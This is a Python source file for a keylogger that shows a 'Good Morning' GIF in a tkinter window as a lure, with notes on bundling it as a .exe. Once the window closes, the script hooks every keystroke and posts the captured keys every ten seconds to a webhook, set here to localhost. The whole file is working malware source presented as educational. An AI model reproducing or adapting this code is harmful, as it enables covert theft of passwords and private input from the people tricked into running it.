"""
This script is a keylogger disguised as a Good Morning gif.
It show the gif in a tkinter window as soon as you run it.
However, once you close the gif window, the keylogger will start running on the background.
It will store the pressed keys in a list and send them to the hook every 10 seconds.
The hook is a simple Flask server that receives the pressed keys and prints them -> hook.py.

OBS: This script is just for educational purposes. It is not intended to be used for malicious purposes.
"""

import keyboard
import tkinter as tk
import threading
import requests
import os
import sys
from PIL import Image, ImageTk, ImageSequence

# Running locally just for educational purposes
url_hook = "http://localhost:5000/hook"
pressed_keys = []

def show_gif():
    """
    Shows a Good Morning gif in a tkinter window.
    """
    def update_gif(idx):
        frame = frames[idx]
        idx = (idx + 1) % len(frames)
        label.configure(image=frame)
        root.after(250, update_gif, idx)

    root = tk.Tk()
    root.title("BOM DIA!!!!!")
    root.geometry("500x500")
    
    # The base python code will call directly the gif file, but the .exe will need to use the BASE_DIR variable
    # This happens because the gif is incorporated into the .exe file
    if getattr(sys, 'frozen', False):  # running from .exe
        BASE_DIR = sys._MEIPASS
    else:  # running from .py
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    gif_path = os.path.join(BASE_DIR, "bom_dia.gif")    
    
    gif = Image.open(gif_path)
    frames = [ImageTk.PhotoImage(img) for img in ImageSequence.Iterator(gif)]
    
    label = tk.Label(root)
    label.pack(pady=20, padx=20)
    
    update_gif(0)
    
    close = tk.Button(root, text="Fechar", command=root.destroy)
    close.pack(pady=10)
    
    root.mainloop()
    main()

def main():
    def send_keys():
        """
        Stores the pressed keys in a list and sends them to the hook every 10 seconds.
        """
        while True:
            if pressed_keys:
                try:
                    requests.post(url_hook, json={"keys": pressed_keys})
                    pressed_keys.clear()
                except Exception as e:
                    print(f"Error while sending keys: {e}")
            threading.Event().wait(10)

    threading.Thread(target=send_keys, daemon=True).start()

    def callback(event):
        if event.event_type == "down":
            pressed_keys.append(event.name)
    
    keyboard.hook(callback)
    keyboard.wait()

if __name__ == "__main__":
    show_gif()
